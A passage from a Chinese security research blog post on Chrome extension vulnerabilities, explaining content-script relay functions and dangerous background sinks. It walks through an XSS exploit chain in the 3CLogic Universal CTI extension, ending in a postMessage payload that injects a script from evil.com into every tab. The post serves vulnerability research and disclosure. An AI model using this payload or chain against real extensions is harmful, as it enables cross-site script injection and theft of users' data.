这样一来，Content层的安全问题就有了几个绕不开的特点：
  * 攻击者只能通过 **window.postMessage** 与后端沟通，传递消息。
  * 如果只能触发Content Script的漏洞，那么只影响当前Web Page，与 **XSS漏洞无异** 。
  * 如果开启了 **all_frame** ,配合 **特殊场景** 可以影响所有的子frame，就可以 **定向攻击任何域** 。
Content层面的的问题因为逃不开诸多的限制，所以危害比较有限，前面的evernote的漏洞已经是非常厉害的一个漏洞了。
  * [Evernote Chrome ext XSS 演示 youtube版本](https://youtu.be/K6Oqb0hVT9k)
# 基于bg层的安全问题
与content层漏洞最大的区别就是，我们没办法 **直接和bg/popup层交互** ，除非本身的逻辑有安全问题。但如果能造成任意代码执行，可能可以
**通过chrome API威胁整个浏览器的各个方面** 。
那么这类漏洞的关键点就在于， **不管后端存不存在有问题的API，在content
script层有可控的`chrome.tabs.sendMessage`信息向pop/popup script传输是这类漏洞首先必备的基础条件**。
### 中转函数
而在部分插件代码中，content script设置中转代码也并不罕见。
**正所谓，上有对策，下有政策。为安全性考量的而设置的限制，也实实在在的影响到了原本的插件开发者。所以开发插件的开发者也通过自己的方式来构造直接传输的通道。**
在3CLogic Universal CTI插件中就有这样的一段代码
    window.addEventListener("message", function (event) {
        try {
            // Accept messages from this window only
            if (typeof (event.data) !== "string") return;
            // Send convert string back to object for passing it to the extension
            const data = JSON.parse(event.data);
            // adding cccce so that this message doesn't mix with messages from other windows
            if (data.method && data.method !== "onCTIAdapterMessage") {
                data.method = `ccce${data.method}`;
            } else {
                ccclogger.log(`Got Adaptor Message`);
            }
            window.chrome.extension.sendMessage(data,
                function (response) {
                    ccclogger.log(response);
                });
        } catch (e) {
            ccclogger.warn(e, e.stack);
        }
    });
这段代码会把接收到的消息通过`window.chrome.extension.sendMessage`转发出去。
通过这样的代码我们就可以直接和popup/bg 层沟通，也代表我们有 **一定的可能** 构造一个利用。
### 恶意函数
反之，我们也可以从利用的角度思考，popup/bg script没办法直接和页面沟通，换言之，也就是说如果在popup/bg
script中存在可以被利用的点，一定是来源于相应的恶意函数。
而其中相应的恶意函数只有几个，分别是：
    chrome.tabs.executeScript
    chrome.tabs.update
    eval
    setTimeout
**executeScript** 可以在任意页面执行代码，而 **update函数** 可以更新页面中的信息，包括url等，
**eval和setTimeout可以执行插件代码** ，但也同样会被可能会受到CSP的限制。
从利用的角度来讲，只有popup/bg script存在这样的函数，并且参数可控，那么才有可能诞生一个漏洞。
### 举个栗子 - 3CLogic Universal CTI XSS
首先根据manifest的内容可以知道，这个插件可以通过构造的方式生效在任意域下。
Content层也存在可控的中转函数
Bg层接收到消息之后，触发processMessage函数
processMessage函数根据传入的操作类型转到相应的接口。其中就包含可以给任意tag插入js的sendInjectEvent函数
sendInjectEvent会将传入的参数拼接到函数内，并通过创建标签的方式为指定的tag新建标签。
整个利用链被链接起来，简化为：
1、构造恶意页面在`“*://*/*3cphone.html*”`，受害者访问该页面/将链接植入到某个点击劫持/URL跳转/。  
2、打开其他目标页面如微博、twitter等。  
3、恶意页面发送。
    window.postMessage(JSON.stringify({
        “method”: “OnInjectScript”,
        “forSite”: “.”, 
        “selectedLibs": [
            https://evil.com/evil.js
        ]}), "*")
4、恶意JS被插入到所有的tag中，我们就可以在任意目标域执行JS，如获取微博消息等。
  * [3CL Chrome ext XSS 演示 youtube版本](https://youtu.be/t4HG7K_JIVg)
## 写在最后
其实可以把整个漏洞分成两部分，寻找中转函数和寻找恶意函数，如果找到满足两个同时条件的情况，再辅以一些人工基本上就能找到一个漏洞。当时也是把这个思路贯彻到KunLun-M上，我会利用工具寻找两个条件的代码，然后做人工审计，当时还是发现了一些漏洞的，后来觉得挖掘需要一定的成本，而且我也没打算拿来作恶，所以这些漏洞也就用不太上，于是后来打算拿出来当议题。（3CL这个漏洞是我挖掘的通用性最高的，同时危害也不算太大）
当时这份研究是在2020年初做的，当时还在知道创宇的404实验室，感觉内容很有趣所以准备拿去当议题。2020年我想大家都懂的，很多会议都取消了，一拖就拖到2021年，本来打算拿去投KCON，但是没有通过。有趣的是在DEFCON2021的一个议题中，提到了差不多的内容。
[Barak Sternberg - Extension-Land - exploits and rootkits in your browser
extensions](https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Barak%20Sternberg%20-%20Extension-Land%20-%20%20exploits%20and%20rootkits%20in%20your%20browser%20extensions.pdf)
除了我的部分内容以外呢，他还提了几个不算太常见的攻击场景，感兴趣可以去看看（但我感觉他把一个简单的东西讲复杂了，这违背了的行文意愿）。因为这个我也没兴趣继续保留这份成果了，今天也公开出来，其中可能有很多老的东西。但是其实也很少有系统的分享插件安全思路的文章，希望这篇文章可以给你带来收获。
* * *